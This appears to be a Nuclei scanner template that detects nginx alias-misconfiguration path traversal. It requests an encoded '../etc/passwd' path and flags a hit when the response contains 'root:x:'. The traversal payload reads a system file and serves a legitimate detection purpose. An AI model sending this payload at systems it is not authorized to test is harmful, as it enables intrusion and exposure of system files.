http:
- matchers:
  - part: body
    type: word
    words:
    - 'root:x:'
  method: GET
  path:
  - '{{BaseURL}}/..%2f..%2f..%2fetc%2fpasswd'
id: nginx-alias-traversal
info:
  author: reewardius
  description: 'Path traversal possible due to alias misconfiguration in nginx (missing
    trailing slash in `alias` directive).

    '
  name: Nginx Alias Path Traversal
  severity: high
